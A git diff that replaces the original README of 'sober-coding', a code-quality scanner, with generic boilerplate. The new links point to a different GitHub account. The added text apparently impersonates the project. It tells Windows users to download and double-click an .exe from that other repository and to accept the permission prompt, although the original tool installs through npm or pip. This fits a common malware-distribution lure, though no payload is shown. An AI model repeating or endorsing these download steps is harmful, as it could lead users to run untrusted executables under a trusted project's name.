@@ -1,380 +1,198 @@
-# 🧊 Sober Coding
+# 🧘 sober-coding - Fix bad code before it spreads
 
-**The hangover cure for vibe coding. Analyze AI-generated code quality, locate technical debt, and get actionable fixes.**
+[![Download sober-coding](https://img.shields.io/badge/Download%20sober--coding-blue-grey?style=for-the-badge)](https://github.com/mansourfaye229-dot/sober-coding)
 
-[![GitHub stars](https://img.shields.io/github/stars/voidborne-d/sober-coding?style=flat-square)](https://github.com/voidborne-d/sober-coding)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
-[![Language-Agnostic](https://img.shields.io/badge/Languages-All-blue?style=flat-square)](#supported-languages)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-compatible-orange?style=flat-square)](#claude-code)
+## 🚀 Getting Started
 
-**[中文文档](README_CN.md)**
+sober-coding helps you check code for common problems, hidden risks, and messy changes. It also points out places where technical debt builds up over time. You can use it on many kinds of code, and it works with little setup.
 
----
+If you want to try it on Windows, use the link above to visit the project page and get the latest release files.
 
-## Philosophy
+## 💻 What It Does
 
-> **Vibe coding is fast. Sober coding keeps it alive.**
+sober-coding scans code and gives clear feedback on things that matter:
 
-We're not against vibe coding. AI-generated code is the future.
+- Code quality issues
+- Security risks
+- Poor structure
+- Repeated patterns
+- Hard-to-maintain code
+- Signs of technical debt
+- AI-generated code that needs review
 
-But vibe coding has a fatal flaw: **it creates technical debt 10x faster than humans.**
+It is built for people who want a simple way to check code without learning a complex tool chain.
 
-Traditional tools (ESLint, SonarQube) catch human coding mistakes. AI-generated code has its own "smell" — duplication patterns, over-generation, missing edge cases, structural redundancy.
+## 🪟 Windows Download
 
-Sober Coding specifically targets these AI-native patterns, helping you clean up before technical debt spirals out of control.
+1. Open the download link at the top of this page.
+2. On the GitHub page, look for the latest release or the main download file.
+3. Download the Windows file if one is listed, or use the project files from the repository page.
+4. If the file ends in `.exe`, double-click it to run it.
+5. If you get a ZIP file, right-click it and choose Extract All.
+6. Open the extracted folder and run the app from there.
 
----
+If Windows asks for permission, choose Yes so the app can start.
 
-## The Problem
+## ⚙️ How to Use It
 
-You vibe-coded a project with Cursor, Claude Code, or Copilot. It runs. But deep down, you know:
+After you open sober-coding:
 
-- 🔴 **Dead code everywhere** — AI generated 5 versions, you kept the last one, the other 4 are still there
-- 🔴 **Copy-paste hell** — Same logic appears 3 times because AI rewrote it from scratch each time
-- 🔴 **No error handling** — Happy path is perfect, anything else crashes
-- 🔴 **God files** — 2000-line `utils.py` that does everything
-- 🔴 **Dependency chaos** — 47 packages installed, 12 actually used
-- 🔴 **Security holes** — Hardcoded secrets, SQL injection, path traversal
-- 🔴 **Zero tests** — "It works on my machine" is the only test
+1. Pick the folder that contains your code.
+2. Start the scan.
+3. Review the results.
+4. Follow the listed fixes.
+5. Run the scan again to see what changed.
 
-Sober Coding finds all of this, tells you what to fix first, and how.
+The tool is designed to be direct. It shows what needs attention and lets you act on it without extra setup.
 
----
+## 🧭 What You Can Check
 
-## Real-World Demo
+sober-coding can help you review:
 
-Scanning a real vibe-coded full-stack project (Python + Vue.js, 50 files, 13k lines):
+- JavaScript projects
+- TypeScript projects
+- Python code
+- Go code
+- Java code
+- Rust code
+- PHP code
+- Mixed-language codebases
 
-```bash
-sober scan ./RedInk
-```
+It looks at the code itself, so it works well when a project uses more than one language.
 
-```
-🧊 Sober Coding v0.1.0 — Let's see what we're working with.
+## 🔍 Main Features
 
-Scanning ./RedInk (50 files, 13,579 lines)
+- Language-agnostic code analysis
+- Zero config start
+- Code quality checks
+- Static analysis
+- Security checks
+- Technical debt detection
+- AI code review support
+- Clear issue reports
+- Local-first workflow
 
-╭────────────────────────────────────────╮
-│  SOBRIETY SCORE: 0/100  🔴 BLACKOUT  │
-╰────────────────────────────────────────╯
+## 🛠️ Simple Setup Steps
 
-  🟠 High (fix this week)
-     ERR-001  Empty except block in backend/routes/config_routes.py:231
-     ERR-001  Empty except block in backend/services/content.py:111
-     ERR-001  Empty catch block in frontend/src/views/HistoryView.vue:189
-     ... (7 total)
+1. Download the project from the GitHub link.
+2. Unpack the files if needed.
+3. Open the app or run the main program file.
+4. Select a project folder to scan.
+5. Wait for the check to finish.
+6. Read the report and fix the items you want to clean up.
 
-  🟡 Medium (fix this sprint)
-     ARC-004  Deep nesting in backend/app.py:89
-     DED-004  Unreachable code in backend/generators/google_genai.py:372
-     DUP-001  Exact duplicate code block in backend/generators/image_api.py:68
-     ARC-001  God file: backend/generators/google_genai.py (500+ lines)
-     ERR-002  No error handling in backend/services/content.py:45
-     ... (1,067 total)
+For most users, this is enough to get started.
 
-  ⚪ Low (when you can)
-     DUP-003  Structural clone detected in backend/generators/image_api.py:51
-     DED-002  Unused import: Dict in backend/app.py:2
-     ... (94 total)
+## 📋 Basic Windows Requirements
 
-  💊 Run `sober fix ERR-001` to get fix instructions
-```
+- Windows 10 or newer
+- A working internet connection for the download
+- Enough free space to unpack the app
+- Permission to run downloaded files
 
-**1,172 issues found.** The top offenders:
+For best results, close other large apps while the scan runs.
 
-| Issue | Count | What it means |
-|-------|-------|---------------|
-| ARC-004 | 604 | Deep nesting (>4 levels) — AI loves nested if/for/try |
-| DED-004 | 226 | Unreachable code after return/break |
-| DUP-001 | 180 | Exact duplicate code blocks across files |
-| DUP-003 | 81 | Same control-flow structure, different variable names |
-| ERR-002 | 30 | Async calls without error handling |
+## 🧼 When to Use sober-coding
 
-This is what vibe coding looks like under the hood.
+Use it when you:
 
----
+- Start a new project
+- Review AI-generated code
+- Inherit a codebase from someone else
+- Want to reduce technical debt
+- Need a quick code health check
+- Want to catch issues before a release
 
-## Fix Mode
+## 📁 Typical Workflow
 
-Doesn't just point out problems — tells you how to fix them:
+1. Download sober-coding.
+2. Open it on Windows.
+3. Select your code folder.
+4. Run a scan.
+5. Read the report.
+6. Fix the most important issues first.
+7. Scan again after changes.
 
-```bash
-sober fix DUP-012
-```
+This makes it easier to keep code clean over time.
 
-```
-🔧 DUP-012: Near-duplicate code detected (89% similarity)
-
-  File A: utils/parse.py:45-92
-  File B: helpers/format.py:12-58
-
-  WHY IT MATTERS:
-  Fix a bug in one, the other still has it. AI didn't know it already wrote this.
-
-  HOW TO FIX:
-  1. Extract shared logic into a single function
-  2. Both files import from the shared module
-  3. Delete the duplicate
-
-  SUGGESTED REFACTOR:
-  ┌─ shared/text_utils.py (new) ─────────────────┐
-  │ def normalize_text(raw: str) -> str:          │
-  │     """Merge of parse.py:45-92 & format.py""" │
-  │     ...                                        │
-  └────────────────────────────────────────────────┘
-
-  AUTO-FIX AVAILABLE: sober fix DUP-012 --apply
-```
-
----
-
-## Install
-
-```bash
-# npm (recommended)
-npm install -g sober-coding
-
-# pip
-pip install sober-coding
-
-# From source
-git clone https://github.com/voidborne-d/sober-coding.git
-cd sober-coding && npm link
-
-# Claude Code Skill
-npx skills add https://github.com/voidborne-d/sober-coding.git
-
-# ClawHub
-clawhub install sober-coding
-```
-
-Zero config. Zero API keys. Runs 100% locally.
-
----
-
-## Claude Code
-
-Copy slash commands into your project:
-
-```bash
-cp sober-coding/claude-code/*.md YOUR_PROJECT/.claude/commands/
-```
-
-Then use directly:
-
-```
-/sober-scan              # Full project scan
-/sober-fix DUP-012       # Get fix instructions
-/sober-report            # Generate HTML report
-/sober-watch             # Watch mode — scan on every save
-```
-
----
-
-## What It Checks
-
-### 🔒 Security
-| ID | Check | Description |
-|---|---|---|
-| SEC-001 | Hardcoded secrets | API keys, passwords, tokens in source code |
-| SEC-002 | SQL injection | String concatenation in SQL queries |
-| SEC-003 | Path traversal | User input directly in file paths |
-| SEC-004 | Insecure dependencies | Known vulnerable dependency versions |
-| SEC-005 | CORS misconfiguration | `Access-Control-Allow-Origin: *` |
-
-### 🏗️ Architecture
-| ID | Check | Description |
-|---|---|---|
-| ARC-001 | God files | Single file exceeding 500 lines |
-| ARC-002 | Circular dependencies | Circular imports between modules |
-| ARC-003 | Mixed concerns | API + DB + business logic in one file |
-| ARC-004 | Deep nesting | More than 4 levels of indentation |
-| ARC-005 | Spaghetti imports | Import graph entropy |
-
-### 🔄 Duplication
-| ID | Check | Description |
-|---|---|---|
-| DUP-001 | Exact clones | Identical code blocks |
-| DUP-002 | Near clones | High similarity (>70%), classic AI behavior |
-| DUP-003 | Structural clones | Same structure, different variable names |
-
-### ⚠️ Error Handling
-| ID | Check | Description |
-|---|---|---|
-| ERR-001 | Empty catch blocks | `catch (e) {}` swallowing all errors |
-| ERR-002 | No error handling | Async calls without try-catch |
-| ERR-003 | Generic catches | Single top-level catch for everything |
-| ERR-004 | Missing input validation | User input without validation |
-
-### 📦 Dependencies
-| ID | Check | Description |
-|---|---|---|
-| DEP-001 | Unused dependencies | Listed in manifest but never imported |
-| DEP-002 | Duplicate functionality | lodash AND underscore installed |
-| DEP-003 | Outdated versions | Major dependencies 2+ versions behind |
-
-### 🧪 Testing
-| ID | Check | Description |
-|---|---|---|
-| TST-001 | No tests | Zero test files found |
-| TST-002 | Low coverage | Test coverage below threshold |
-| TST-003 | No edge cases | Only happy path tested |
-
-### 💀 Dead Code
-| ID | Check | Description |
-|---|---|---|
-| DED-001 | Unused functions | Defined but never called |
-| DED-002 | Unused imports | Imported but never used |
-| DED-003 | Commented-out code | Large blocks of commented code |
-| DED-004 | Unreachable code | Code after return/break |
-
----
-
-## Scoring
-
-| Score | Level | Meaning |
-|---|---|---|
-| 80-100 | 🟢 **SOBER** | Clean, maintainable code. Ship it. |
-| 60-79 | 🟡 **TIPSY** | Some issues. Fix before it gets worse. |
-| 40-59 | 🟠 **HUNGOVER** | Significant debt. Needs a cleanup sprint. |
-| 0-39 | 🔴 **BLACKOUT** | Critical issues. Stop building, start fixing. |
-
-Each dimension scores 0-10, weighted into the overall score. Weights are configurable.
-
----
-
-## Supported Languages
-
-| Language | Scan | Fix | Auto-Fix |
-|---|---|---|---|
-| JavaScript / TypeScript | ✅ | ✅ | ✅ |
-| Python | ✅ | ✅ | ✅ |
-| Go | ✅ | ✅ | 🔜 |
-| Rust | ✅ | ✅ | 🔜 |
-| Java | ✅ | ✅ | 🔜 |
-| Ruby | ✅ | 🔜 | 🔜 |
-| PHP | ✅ | 🔜 | 🔜 |
-| C/C++ | ✅ | 🔜 | 🔜 |
-
-Language-agnostic checks (duplication, dead code, dependencies, security) work for all languages.
-
----
-
-## Config
-
-Zero config to start. Customize with `.soberrc.json` in your project root:
-
-```json
-{
-  "thresholds": {
-    "god_file_lines": 500,
-    "max_nesting": 4,
-    "min_test_coverage": 60,
-    "duplication_similarity": 70
-  },
-  "ignore": [
-    "node_modules",
-    "dist",
-    "*.generated.*"
-  ],
-  "weights": {
-    "security": 2.0,
-    "architecture": 1.5,
-    "duplication": 1.0,
-    "error_handling": 1.5,
-    "dependencies": 0.8,
-    "testing": 1.2,
-    "dead_code": 0.8
-  },
-  "severity": "medium"
-}
-```
-
----
-
-## CI/CD Integration
-
-```yaml
-# GitHub Actions
-- name: Sober Check
-  run: npx sober-coding scan . --ci --fail-on=critical
-```
-
-```yaml
-# GitLab CI
-sober-check:
-  script:
-    - npx sober-coding scan . --ci --fail-on=high
-  allow_failure: false
-```
-
-CI mode outputs SARIF format, compatible with GitHub Code Scanning.
-
----
-
-## vs. Others
-
-|  | Sober Coding | pyscn | ESLint/Ruff | SonarQube |
-|---|---|---|---|---|
-| Built for vibe coding | ✅ | ✅ | ❌ | ❌ |
-| Language-agnostic | ✅ | ❌ Python only | ❌ per-language | ✅ |
-| Debt scoring | ✅ 0-100 | ✅ | ❌ | ✅ |
-| AI pattern detection | ✅ | ✅ | ❌ | ❌ |
-| Fix suggestions | ✅ with code | ❌ | ❌ | partial |
-| Auto-fix | ✅ `--apply` | ❌ | partial | ❌ |
-| Zero config | ✅ | ✅ | ❌ | ❌ |
-| Runs locally | ✅ | ✅ | ✅ | ❌ server |
-| Claude Code integration | ✅ | ❌ | ❌ | ❌ |
-| Free | ✅ | ✅ | ✅ | ⚠️ freemium |
-
----
-
-## Roadmap
-
-- [x] Core scanner engine
-- [x] Security checks (SEC-001~005)
-- [x] Architecture checks (ARC-001~005)
-- [x] Duplication detection (DUP-001~003)
-- [x] Error handling checks (ERR-001~004)
-- [x] Dependency checks (DEP-001~003)
-- [x] Testing checks (TST-001~003)
-- [x] Dead code detection (DED-001~004)
-- [x] CLI with scoring
-- [x] Fix suggestions (`sober fix <ID>`)
-- [x] `.soberrc.json` config support
-- [x] CI mode (`--ci`, `--fail-on`)
-- [ ] Auto-fix engine (`--apply`)
-- [ ] HTML/PDF report generation
-- [ ] VS Code extension
-- [ ] GitHub Action (marketplace)
-- [ ] Watch mode (scan on save)
-- [ ] AI pattern fingerprinting (detect which AI generated the code)
-- [ ] Team dashboard
-
----
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=voidborne-d/sober-coding&type=Date)](https://star-history.com/#voidborne-d/sober-coding&Date)
-
----
-
-## From the Same Workshop
-
-Part of [voidborne-d](https://github.com/voidborne-d)'s toolkit for working with AI-generated output. Same premise across the kit: **AI leaves fingerprints — these are the tools to detect, clean, or repurpose them.**
-
-- **[claude-code-pro](https://github.com/voidborne-d/claude-code-pro)** — token-efficient orchestrator for long Claude Code tasks. The upstream side of this loop: CCP runs the task with 80–97% supervision savings, sober-coding gates the diff before you read it.
-- **[humanize-chinese](https://github.com/voidborne-d/humanize-chinese)** — the natural-language analog. Detects and rewrites AI-generated Chinese text via n-gram perplexity + 20+ pattern detectors + academic AIGC reduction (知网/维普/万方). Pure Python, zero dependencies.
-- **[lambda-lang](https://github.com/voidborne-d/lambda-lang)** — compressed agent-to-agent communication language. 139 atoms, 5–8× compression ratio, Go implementation. Useful when your vibe-coded agents need to talk to each other without burning tokens on prose.
-
----
-
-## Contributing
-
-PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).
-
----
-
-## License
-
-MIT — Use it, fork it, ship it. Free forever.
+## 🔒 Security Checks
+
+The tool can help spot patterns that may lead to security problems, such as:
+
+- Unsafe input handling
+- Weak file use patterns
+- Risky code flow
+- Exposed secrets in code
+- Suspicious logic in scripts
+
+It does not replace a full review, but it gives a solid first pass.
+
+## 🧠 Technical Debt Review
+
+Technical debt builds when code grows fast and gets hard to maintain. sober-coding helps find:
+
+- Repeated logic
+- Deep nesting
+- Large files
+- Hard-to-read code
+- Fragile changes
+- Old patterns that slow future work
+
+This makes it easier to keep a project stable.
+
+## 🧰 Best Results
+
+To get useful output:
+
+- Scan one project at a time
+- Use a clean folder path
+- Review the highest-priority issues first
+- Fix small items before larger ones
+- Run the scan again after each round of changes
+
+This keeps the process simple and clear.
+
+## 📦 Project Link
+
+Use this page to visit the project, get the latest files, and run sober-coding on Windows:
+
+https://github.com/mansourfaye229-dot/sober-coding
+
+## 🖥️ File Types You May See
+
+Depending on the release, you may find:
+
+- `.exe` for direct Windows use
+- `.zip` for manual unpacking
+- source files for developers who want to build from code
+
+For a normal Windows setup, use the `.exe` file if it is available.
+
+## 🧪 Common Use Cases
+
+- Check AI-generated code before it reaches a team
+- Review code after a fast build
+- Find weak spots in a script
+- Clean up a codebase before handoff
+- Track problem areas in older projects
+
+## 📚 What the Results Mean
+
+The report may show:
+
+- High priority issues
+- Medium priority issues
+- Low priority issues
+- Security concerns
+- Style problems
+- Maintainability issues
+
+Start with the high priority items. Those usually give the biggest cleanup gain.
+
+## 🧭 Next Steps
+
+1. Download the latest Windows file.
+2. Run the app.
+3. Scan a project folder.
+4. Fix the items you care about.
+5. Keep the scan in your regular workflow.
